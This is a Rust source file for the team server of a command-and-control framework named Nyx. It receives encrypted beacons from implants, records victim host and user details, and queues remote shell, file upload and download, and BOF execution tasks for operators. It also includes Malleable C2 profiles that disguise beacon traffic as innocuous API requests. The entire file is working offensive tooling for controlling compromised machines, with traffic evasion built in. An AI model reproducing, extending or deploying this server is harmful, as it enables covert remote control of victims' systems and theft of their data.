//! Nyx team server (HTTP, P0).
//!
//! Routes:
//! - `POST /beacon`            — implant traffic (encrypted frame); returns queued tasks.
//! - `GET  /api/sessions`      — list registered sessions (JSON).
//! - `POST /api/task`          — queue a task for a session (JSON).
//! - `GET  /api/results`       — drain task results for a session (JSON).

pub mod tls;

use std::sync::Arc;
use std::time::{Instant, SystemTime, UNIX_EPOCH};

use axum::{
    body::Bytes,
    extract::{ConnectInfo, Query, State},
    http::{HeaderMap, StatusCode},
    response::{IntoResponse, Response},
    routing::{get, post},
    Json, Router,
};
use dashmap::DashMap;
use nyx_protocol::{
    encode_frame, open_frame, parse_frame, wire::Reader, Command, Response as MsgResponse,
    ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
};
use serde::{Deserialize, Serialize};

/// A session is keyed by the implant's 32-byte ephemeral public key.
pub type SessionId = [u8; 32];

pub struct Session {
    pub key: SessionKey,
    pub info: SessionInfo,
    pub last_recv: u64,
    pub send_counter: u64,
    pub next_task_id: u64,
    pub pending: Vec<Task>,
    pub results: Vec<TaskResponse>,
    pub created: Instant,
    /// Inbound TLS JA3 (MD5, 32 hex) of the connecting beacon, if captured by
    /// the ClientHello sniffer. `None` on plaintext or when sniff failed.
    pub ja3: Option<String>,
    /// Inbound TLS JA4 (FoxIO `a_b_c`), if captured.
    pub ja4: Option<String>,
}

pub struct AppState {
    pub keypair: ServerKeypair,
    pub sessions: DashMap<SessionId, Session>,
    /// Active Malleable C2 profile (loaded from `NYX_PROFILE`). When present,
    /// the beacon handler is also served at the profile's transaction URIs.
    pub profile: Option<nyx_profile::Profile>,
    /// If set, control-API requests (`/api/*`) must carry
    /// `Authorization: Bearer <api_token>`. Beacon traffic is exempt (implants
    /// authenticate cryptographically, not with a shared token).
    pub api_token: Option<String>,
    /// Optional kill date (Unix seconds). Checked at boot AND on every beacon:
    /// once the current time passes it, the server stops serving beacons.
    pub killdate: Option<u64>,
    /// Scripting event bus. Hooks are registered at construction; the beacon
    /// handler fires `SessionNew` / `ResultReceived` events into it.
    pub events: nyx_scripting::EventBus,
    /// Inbound TLS fingerprints keyed by peer socket address, populated by the
    /// ClientHello sniffer on the TLS path. The beacon handler pops the entry
    /// for its peer on check-in and stamps it onto the new session. Plaintext
    /// (dev) connections never populate this (no ClientHello to sniff).
    pub fingerprints: DashMap<std::net::SocketAddr, Fingerprint>,
}

/// A captured inbound TLS fingerprint (JA3 + JA4), keyed by peer addr.
#[derive(Debug, Clone, Default)]
pub struct Fingerprint {
    pub ja3: Option<String>,
    pub ja4: Option<String>,
}

impl AppState {
    /// Register the server's built-in scripting hooks (currently a hook that
    /// mirrors events into the tracing log). Call once, before sharing.
    pub fn register_default_hooks(&mut self) {
        self.events.register(Box::new(TracingEventHook));
    }
}

impl Default for AppState {
    fn default() -> Self {
        Self {
            keypair: ServerKeypair::generate(),
            sessions: DashMap::new(),
            profile: None,
            api_token: None,
            killdate: None,
            events: nyx_scripting::EventBus::new(),
            fingerprints: DashMap::new(),
        }
    }
}

/// Bridge scripting events into the server's `tracing` log (the default hook).
struct TracingEventHook;

impl nyx_scripting::Hook for TracingEventHook {
    fn name(&self) -> &str {
        "tracing"
    }
    fn on_event(&self, event: &nyx_scripting::Event) {
        match event {
            nyx_scripting::Event::SessionNew(s) => tracing::info!(
                target: "nyx::scripting",
                session = %s.session_id,
                user = %s.username,
                host = %s.hostname,
                "scripting: session_new"
            ),
            nyx_scripting::Event::ResultReceived(r) => tracing::debug!(
                target: "nyx::scripting",
                session = %r.session_id,
                task = r.task_id,
                "scripting: result"
            ),
            nyx_scripting::Event::SessionExit(s) => tracing::info!(
                target: "nyx::scripting",
                session = %s.session_id,
                "scripting: session_exit"
            ),
        }
    }
}

/// Map a wire [`MsgResponse`] to a scripting event's kind + short summary.
fn response_event_kind(r: &MsgResponse) -> (nyx_scripting::ResultKind, String) {
    match r {
        MsgResponse::Output(b) => (
            nyx_scripting::ResultKind::Output,
            String::from_utf8_lossy(b).chars().take(64).collect(),
        ),
        MsgResponse::Ok => (nyx_scripting::ResultKind::Ok, String::new()),
        MsgResponse::Err(m) => (nyx_scripting::ResultKind::Err, m.clone()),
        MsgResponse::FileChunk { name, .. } => {
            (nyx_scripting::ResultKind::FileChunk, format!("<chunk {name}>"))
        }
        MsgResponse::BofOutput(b) => (
            nyx_scripting::ResultKind::Other,
            String::from_utf8_lossy(b).chars().take(64).collect(),
        ),
        MsgResponse::Channel { chan, .. } => {
            (nyx_scripting::ResultKind::Other, format!("<chan {chan}>"))
        }
    }
}

/// Load + lint a Malleable C2 profile from disk. Returns the parsed profile, or
/// an error if the file can't be read, fails to parse, or has `c2lint` errors.
pub fn load_profile(path: &std::path::Path) -> anyhow::Result<nyx_profile::Profile> {
    let src = std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("read profile {}: {e}", path.display()))?;
    let profile = nyx_profile::parse(&src)
        .map_err(|e| anyhow::anyhow!("parse profile: {e}"))?;
    let errors: Vec<_> = nyx_profile::lint(&profile)
        .into_iter()
        .filter(|d| d.severity == nyx_profile::Severity::Error)
        .collect();
    if errors.is_empty() {
        Ok(profile)
    } else {
        let msgs: Vec<_> = errors
            .iter()
            .map(|d| format!("  line {}: {}", d.line, d.message))
            .collect();
        anyhow::bail!(
            "profile {} has {} lint error(s):\n{}",
            path.display(),
            errors.len(),
            msgs.join("\n")
        )
    }
}

/// Load the server's long-term keypair from `path`, or generate + persist it
/// (0600 on Unix) if absent. With `NYX_KEYFILE` set, sessions survive a server
/// restart instead of getting a fresh identity each boot.
pub fn load_or_create_keypair(path: &std::path::Path) -> anyhow::Result<nyx_protocol::ServerKeypair> {
    use nyx_protocol::ServerKeypair;
    if path.exists() {
        let bytes = std::fs::read(path)?;
        let arr: [u8; 32] = bytes
            .as_slice()
            .try_into()
            .map_err(|_| anyhow::anyhow!("keyfile {} is not 32 bytes", path.display()))?;
        Ok(ServerKeypair::from_secret_bytes(arr))
    } else {
        let kp = ServerKeypair::generate();
        std::fs::write(path, kp.to_secret_bytes())?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600));
        }
        Ok(kp)
    }
}

/// Load + compile a Rhai operator script (`NYX_SCRIPT`) into a hook. Errors if
/// the file can't be read or has a syntax error.
pub fn load_script(path: &std::path::Path) -> anyhow::Result<nyx_scripting_rhai::RhaiHook> {
    let src = std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("read script {}: {e}", path.display()))?;
    nyx_scripting_rhai::RhaiHook::new(&path.display().to_string(), &src)
        .map_err(|e| anyhow::anyhow!("compile script {}: {e}", path.display()))
}

pub fn router(state: Arc<AppState>) -> Router {
    // Collect any profile-declared beacon URIs + their `set verb` before `state`
    // moves into the router. The beacon handler is URI-agnostic (it just
    // decrypts the body), so serving it at the profile's transaction URIs makes
    // the beacon path malleable — the most fingerprinted C2 indicator — without
    // touching crypto. We honour `set verb` (GET/POST) so the registered method
    // matches what the profile says the beacon will use.
    let extra: Vec<(String, bool)> = state
        .profile
        .as_ref()
        .map(|p| {
            // (uri, is_post). Each transaction block's verb defaults to its name
            // (http-get → GET, http-post → POST) unless overridden by `set verb`.
            let mut out: Vec<(String, bool)> = Vec::new();
            for (txn, default_post) in [("http-post", true), ("http-get", false)] {
                for b in p.blocks(txn) {
                    let Some(uri) = b.get("uri").map(|u| u.as_str().into_owned()) else {
                        continue;
                    };
                    let verb = b.get("verb").map(|v| v.as_str().to_ascii_uppercase());
                    let is_post = match verb.as_deref() {
                        Some("POST") => true,
                        Some("GET") => false,
                        _ => default_post,
                    };
                    out.push((uri, is_post));
                }
            }
            out
        })
        .unwrap_or_default();

    let mut r = Router::new()
        .route("/beacon", post(beacon))
        .route("/api/sessions", get(list_sessions))
        .route("/api/task", post(post_task))
        .route("/api/tasks", get(get_tasks))
        .route("/api/results", get(get_results))
        .route("/api/profile", get(get_profile));
    let mut seen = std::collections::HashSet::new();
    for (uri, is_post) in extra {
        if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
            continue;
        }
        r = if is_post {
            r.route(&uri, post(beacon))
        } else {
            r.route(&uri, get(beacon))
        };
    }
    r.with_state(state)
}

// ---- implant endpoint ------------------------------------------------------

async fn beacon(
    State(st): State<Arc<AppState>>,
    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
    body: Bytes,
) -> Response {
    match handle_beacon(&st, &peer, &body) {
        Ok(frame) => shape_beacon_response(&st, frame),
        Err(e) => {
            tracing::warn!(error = %e, "beacon handler error");
            StatusCode::BAD_REQUEST.into_response()
        }
    }
}

/// Apply the Malleable C2 profile's server-side envelope to the encrypted
/// frame the beacon handler produced. With no profile (or a profile whose
/// `http-post` has no `server { output { } }` block), the envelope is a no-op
/// and the raw frame is returned as before — so this is strictly opt-in.
///
/// The `http-post` transaction is the beacon's task-delivery channel, so its
/// `server.output` transform chain + `header` statements shape the response.
/// Transforming the body makes beacon traffic match the transaction the profile
/// describes (e.g. base64+prepend so the body looks like a JSON field) instead
/// of leaking a raw encrypted frame.
fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
    let Some(profile) = &st.profile else {
        return (StatusCode::OK, body_bytes(frame)).into_response();
    };
    let env = nyx_profile::post_server_envelope(profile);
    if env.terminator.is_none() && env.steps.is_empty() && env.headers.is_empty() {
        // No envelope declared — raw frame, legacy behaviour.
        return (StatusCode::OK, body_bytes(frame)).into_response();
    }
    let (body, extra) = env.shape_body(&frame);

    let mut resp = (StatusCode::OK, body_bytes(body)).into_response();

    // Apply profile-declared response headers. CS `header "N" "V"` sets static
    // pairs; when the terminator is a header, the transformed bytes go there too.
    use axum::http::HeaderValue;
    for (name, val) in &env.headers {
        if let (Ok(n), Ok(v)) = (
            axum::http::HeaderName::from_bytes(name),
            HeaderValue::from_bytes(val),
        ) {
            resp.headers_mut().insert(n, v);
        }
    }
    // If the output terminator is a named header, inject the transformed frame
    // bytes there (overriding any static value for that name). For a Parameter
    // terminator the bytes can't ride in a query string on a *response* (the
    // server doesn't control the beacon's request URL), so they go in the body
    // — the agent inverts them from the body. uri-append is request-side only
    // (the beacon appends to its own URL), so on the response path it falls back
    // to the body as well.
    match &env.terminator {
        Some(nyx_profile::Terminator::Header(h)) => {
            if let (Ok(n), Ok(v)) = (
                axum::http::HeaderName::from_bytes(h.as_bytes()),
                HeaderValue::from_bytes(&extra),
            ) {
                resp.headers_mut().insert(n, v);
            } else {
                // The transform output isn't valid header bytes (non-ASCII after
                // a non-base64 chain like mask). Log so the operator sees the
                // profile/transform incompatibility instead of silent frame loss.
                tracing::warn!(
                    header = %h,
                    "profile output terminator 'header' produced non-ASCII bytes \
                     (need base64/hex in the transform chain); response body empty"
                );
            }
        }
        Some(nyx_profile::Terminator::Parameter(_))
        | Some(nyx_profile::Terminator::UriAppend) => {
            // The transformed bytes belong in the body for the response path.
            if !extra.is_empty() {
                resp = (StatusCode::OK, body_bytes(extra)).into_response();
                // Re-apply static headers (the body swap dropped them).
                use axum::http::HeaderValue;
                for (name, val) in &env.headers {
                    if let (Ok(n), Ok(v)) = (
                        axum::http::HeaderName::from_bytes(name),
                        HeaderValue::from_bytes(val),
                    ) {
                        resp.headers_mut().insert(n, v);
                    }
                }
            }
        }
        _ => {}
    }
    resp
}

/// Wrap a Vec<u8> as an axum response body.
fn body_bytes(b: Vec<u8>) -> axum::body::Body {
    axum::body::Body::from(b)
}

/// Constant-time byte comparison to avoid timing oracles on secrets.
fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        diff |= x ^ y;
    }
    diff == 0
}

fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> anyhow::Result<Vec<u8>> {
    // Kill date: once reached, refuse all beacon traffic so a burned server goes
    // dark (checked per-request, not just at boot, so a long-running server
    // honors it too).
    if let Some(kd) = st.killdate {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        if now >= kd {
            anyhow::bail!("kill date {kd} reached; refusing beacon");
        }
    }
    let raw = parse_frame(body)?;
    let is_new = !st.sessions.contains_key(&raw.pubkey);

    let key = if is_new {
        st.keypair.derive_for(&raw.pubkey)
    } else {
        let s = st.sessions.get(&raw.pubkey).expect("checked above");
        // Anti-replay: reject non-monotonic counters.
        if raw.counter <= s.last_recv {
            anyhow::bail!("replayed/stale counter {}", raw.counter);
        }
        s.key
    };

    let plaintext = open_frame(&key, &raw).map_err(|_| anyhow::anyhow!("frame decryption failed"))?;

    if is_new {
        // First message from an implant is always its SessionInfo (check-in).
        let mut r = Reader::new(&plaintext);
        let info = SessionInfo::decode(&mut r)?;
        tracing::info!(
            beacon_id = info.beacon_id,
            host = %info.hostname,
            user = %info.username,
            os = %info.os,
            "new session registered"
        );
        let new_event = nyx_scripting::Event::SessionNew(nyx_scripting::SessionNew {
            session_id: hex::encode(raw.pubkey),
            hostname: info.hostname.clone(),
            username: info.username.clone(),
            os: info.os.clone(),
            is_admin: info.is_admin == 1,
        });
        // Pop the inbound TLS fingerprint the sniffer captured for this peer
        // (TLS path). On plaintext (dev) or when sniff failed, both stay None.
        let fp = st.fingerprints.remove(peer).map(|(_, v)| v).unwrap_or_default();
        let session = Session {
            key,
            info,
            last_recv: raw.counter,
            send_counter: 0,
            next_task_id: 1,
            pending: Vec::new(),
            results: Vec::new(),
            created: Instant::now(),
            ja3: fp.ja3,
            ja4: fp.ja4,
        };
        st.sessions.insert(raw.pubkey, session);
        st.events.fire(&new_event);
        // No tasks queued yet — reply with an empty batch.
        Ok(encode_frame(&raw.pubkey, 0, &key, &Task::encode_vec(&[])))
    } else {
        // Subsequent messages carry task responses; we reply with queued tasks.
        let responses = TaskResponse::decode_vec(&plaintext)?;
        // Fire a ResultReceived scripting event per response (read-only pass
        // over `responses` before they're moved into the session below).
        let session_id = hex::encode(raw.pubkey);
        for r in &responses {
            let (kind, summary) = response_event_kind(&r.response);
            st.events.fire(&nyx_scripting::Event::ResultReceived(
                nyx_scripting::ResultReceived {
                    session_id: session_id.clone(),
                    task_id: r.task_id,
                    kind,
                    summary,
                },
            ));
        }
        {
            let mut s = st.sessions.get_mut(&raw.pubkey).expect("checked above");
            s.last_recv = raw.counter;
            for r in responses {
                s.results.push(r);
            }
        }
        let (reply, counter) = {
            let mut s = st.sessions.get_mut(&raw.pubkey).expect("checked above");
            let tasks = std::mem::take(&mut s.pending);
            s.send_counter += 1;
            (Task::encode_vec(&tasks), s.send_counter)
        };
        Ok(encode_frame(&raw.pubkey, counter, &key, &reply))
    }
}

// ---- control API -----------------------------------------------------------

#[derive(Serialize)]
struct SessionView {
    id: String,
    beacon_id: u32,
    hostname: String,
    username: String,
    os: String,
    arch: u8,
    pid: u32,
    is_admin: u8,
    pending: usize,
    age_secs: u64,
    /// Inbound TLS JA3 (if captured by the ClientHello sniffer).
    #[serde(skip_serializing_if = "Option::is_none")]
    ja3: Option<String>,
    /// Inbound TLS JA4 (if captured).
    #[serde(skip_serializing_if = "Option::is_none")]
    ja4: Option<String>,
}

/// If an API token is configured, every control-API request must carry
/// `Authorization: Bearer <token>`. `/beacon` is exempt (implants authenticate
/// cryptographically). Returns `Ok(())` when allowed, else a 401 `Response`.
///
/// Comparison is constant-time to avoid a timing oracle on the operator token
/// (the API token gates tasking on every active beacon — a side-channel leak is
/// a serious operational risk).
fn require_auth(st: &AppState, headers: &HeaderMap) -> Option<Response> {
    let Some(expected) = &st.api_token else {
        return None;
    };
    let want = format!("Bearer {expected}");
    let got = headers
        .get(axum::http::header::AUTHORIZATION)
        .and_then(|h| h.to_str().ok());
    // Constant-time comparison: compare lengths then XOR-accumulate all bytes.
    // A timing attacker learns nothing about how many leading bytes matched.
    let ok = match got {
        Some(g) => constant_time_eq(want.as_bytes(), g.as_bytes()),
        None => false,
    };
    if ok {
        None
    } else {
        Some(StatusCode::UNAUTHORIZED.into_response())
    }
}

async fn list_sessions(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    let mut out = Vec::new();
    for entry in st.sessions.iter() {
        out.push(SessionView {
            id: hex::encode(entry.key()),
            beacon_id: entry.info.beacon_id,
            hostname: entry.info.hostname.clone(),
            username: entry.info.username.clone(),
            os: entry.info.os.clone(),
            arch: entry.info.arch,
            pid: entry.info.pid,
            is_admin: entry.info.is_admin,
            pending: entry.pending.len(),
            age_secs: entry.created.elapsed().as_secs(),
            ja3: entry.ja3.clone(),
            ja4: entry.ja4.clone(),
        });
    }
    Json(out).into_response()
}

#[derive(Deserialize)]
struct TaskReq {
    session: String,
    command: JsonCommand,
}

#[derive(Deserialize)]
#[serde(tag = "type", rename_all = "lowercase")]
enum JsonCommand {
    Ping,
    Shell { args: String },
    Sleep { seconds: u32, jitter_pct: u8 },
    /// Write `data_hex` (hex-encoded bytes) to a file named `name` on the target.
    Upload { name: String, data_hex: String },
    /// Read `path` off the target (streamed back as `FileChunk`s).
    Download { path: String },
    /// Execute a BOF/COFF object: `name` (entry label), `args`, `data_hex`
    /// (hex-encoded COFF bytes). Output streams back as a `BofOutput` result.
    Bof {
        name: String,
        args: Vec<String>,
        data_hex: String,
    },
    Exit,
}

impl JsonCommand {
    /// Convert to a wire [`Command`]. `Upload` decodes its hex payload here; a
    /// malformed hex string is surfaced as an error for a 400 response.
    fn into_command(self) -> Result<Command, &'static str> {
        Ok(match self {
            JsonCommand::Ping => Command::Ping,
            JsonCommand::Shell { args } => Command::Shell { args },
            JsonCommand::Sleep { seconds, jitter_pct } => Command::Sleep { seconds, jitter_pct },
            JsonCommand::Upload { name, data_hex } => {
                let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                Command::Upload { name, data }
            }
            JsonCommand::Download { path } => Command::Download { path },
            JsonCommand::Bof {
                name,
                args,
                data_hex,
            } => {
                let blob = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                Command::Bof { name, args, blob }
            }
            JsonCommand::Exit => Command::Exit,
        })
    }
}

#[derive(Serialize)]
struct TaskAck {
    task_id: u64,
}

fn parse_session_hex(s: &str) -> Option<SessionId> {
    let v = hex::decode(s).ok()?;
    <[u8; 32]>::try_from(v.as_slice()).ok()
}

async fn post_task(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<TaskReq>,
) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    let id = match parse_session_hex(&req.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let command = match req.command.into_command() {
        Ok(c) => c,
        Err(msg) => return (StatusCode::BAD_REQUEST, msg).into_response(),
    };
    let mut s = match st.sessions.get_mut(&id) {
        Some(s) => s,
        None => return (StatusCode::NOT_FOUND, "no such session").into_response(),
    };
    let task_id = s.next_task_id;
    s.next_task_id += 1;
    s.pending.push(Task { task_id, command });
    (StatusCode::OK, Json(TaskAck { task_id })).into_response()
}

#[derive(Deserialize)]
struct ResultsQuery {
    session: String,
}

#[derive(Serialize)]
struct ResultView {
    task_id: u64,
    kind: String,
    text: String,
    /// Present only for `FileChunk` results (hex-encoded chunk bytes).
    #[serde(skip_serializing_if = "Option::is_none")]
    data_hex: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    seq: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    eof: Option<u8>,
}

async fn get_results(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<ResultsQuery>,
) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    let id = match parse_session_hex(&q.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let drained = match st.sessions.get_mut(&id) {
        Some(mut s) => std::mem::take(&mut s.results),
        None => return (StatusCode::NOT_FOUND, "no such session").into_response(),
    };
    let views: Vec<ResultView> = drained
        .into_iter()
        .map(|r| {
            let (kind, text, data_hex, seq, eof) = match r.response {
                MsgResponse::Output(b) => {
                    ("output", String::from_utf8_lossy(&b).into_owned(), None, None, None)
                }
                MsgResponse::Ok => ("ok", String::new(), None, None, None),
                MsgResponse::Err(m) => ("error", m, None, None, None),
                MsgResponse::FileChunk { name, seq, eof, data } => (
                    "file",
                    format!("<chunk {name}#{seq}>"),
                    Some(hex::encode(&data)),
                    Some(seq),
                    Some(eof),
                ),
                MsgResponse::BofOutput(b) => {
                    ("bof", String::from_utf8_lossy(&b).into_owned(), None, None, None)
                }
                MsgResponse::Channel { chan, status, data } => (
                    "channel",
                    format!("<chan {chan}#{status}>"),
                    Some(hex::encode(&data)),
                    None,
                    None,
                ),
            };
            ResultView {
                task_id: r.task_id,
                kind: kind.to_string(),
                text,
                data_hex,
                seq,
                eof,
            }
        })
        .collect();
    (StatusCode::OK, Json(views)).into_response()
}

/// Short name for a wire [`Command`] variant (for operator-facing views).
fn command_name(c: &Command) -> &'static str {
    match c {
        Command::Ping => "ping",
        Command::Sleep { .. } => "sleep",
        Command::Shell { .. } => "shell",
        Command::Upload { .. } => "upload",
        Command::Download { .. } => "download",
        Command::Bof { .. } => "bof",
        Command::Connect { .. } => "connect",
        Command::Socks { .. } => "socks",
        Command::Exit => "exit",
    }
}

#[derive(Serialize)]
struct TaskView {
    task_id: u64,
    command: String,
}

/// `GET /api/tasks?session=<hex>` — the pending task queue for a session.
async fn get_tasks(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<ResultsQuery>,
) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    let id = match parse_session_hex(&q.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let views: Vec<TaskView> = match st.sessions.get(&id) {
        Some(s) => s
            .pending
            .iter()
            .map(|t| TaskView {
                task_id: t.task_id,
                command: command_name(&t.command).to_string(),
            })
            .collect(),
        None => Vec::new(),
    };
    Json(views).into_response()
}

#[derive(Serialize)]
struct ProfileView {
    loaded: bool,
    http_get_uri: Option<String>,
    http_post_uri: Option<String>,
    useragent: Option<String>,
}

/// `GET /api/profile` — the active Malleable C2 profile summary (or `loaded:
/// false`). Lets an operator / the Tauri client see what's shaping traffic.
async fn get_profile(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    let view = ProfileView {
        loaded: st.profile.is_some(),
        http_get_uri: st
            .profile
            .as_ref()
            .and_then(|p| p.http_get())
            .and_then(|b| b.get("uri"))
            .map(|u| u.as_str().into_owned()),
        http_post_uri: st
            .profile
            .as_ref()
            .and_then(|p| p.http_post())
            .and_then(|b| b.get("uri"))
            .map(|u| u.as_str().into_owned()),
        useragent: st
            .profile
            .as_ref()
            .and_then(|p| p.option("useragent"))
            .map(|u| u.as_str().into_owned()),
    };
    Json(view).into_response()
}

#[cfg(test)]
mod tests {
    use super::*;

    const MIN_PROFILE: &str = r#"http-get { set uri "/api/v1/Updates"; client { metadata { header "Cookie"; } } server { output { print; } } } http-post { set uri "/api/v1/Telemetry"; client { output { print; } } server { output { print; } } }"#;

    #[test]
    fn load_profile_accepts_valid() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("ok.profile");
        std::fs::write(&path, MIN_PROFILE).unwrap();
        let p = load_profile(&path).expect("valid profile must load + lint clean");
        assert_eq!(
            p.http_post().unwrap().get("uri").unwrap().as_str(),
            "/api/v1/Telemetry"
        );
    }

    #[test]
    fn load_profile_rejects_lint_errors() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bad.profile");
        // missing http-get -> c2lint error
        std::fs::write(
            &path,
            r#"http-post { set uri "/p"; client { output { print; } } server { output { print; } } }"#,
        )
        .unwrap();
        assert!(
            load_profile(&path).is_err(),
            "a profile with lint errors must be rejected"
        );
    }

    #[test]
    fn keypair_persists_across_restart() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("server.key");
        let kp1 = load_or_create_keypair(&path).expect("create keypair");
        assert!(path.exists(), "keyfile must be created");
        let pub1 = kp1.public_bytes();
        // A second load must restore the SAME identity (sessions survive restart).
        let kp2 = load_or_create_keypair(&path).expect("reload keypair");
        assert_eq!(
            kp2.public_bytes(),
            pub1,
            "reloading the keyfile must restore the same identity"
        );
    }

    #[test]
    fn load_script_compiles_valid_and_rejects_bad() {
        let dir = tempfile::tempdir().unwrap();
        let good = dir.path().join("ok.rhai");
        std::fs::write(&good, r#"fn on_session_new(s) { nyx_log(s["hostname"]); }"#).unwrap();
        assert!(load_script(&good).is_ok(), "valid Rhai script must compile");

        let bad = dir.path().join("bad.rhai");
        std::fs::write(&bad, "fn ( broken").unwrap();
        assert!(
            load_script(&bad).is_err(),
            "a syntactically broken script must be rejected"
        );
    }
}
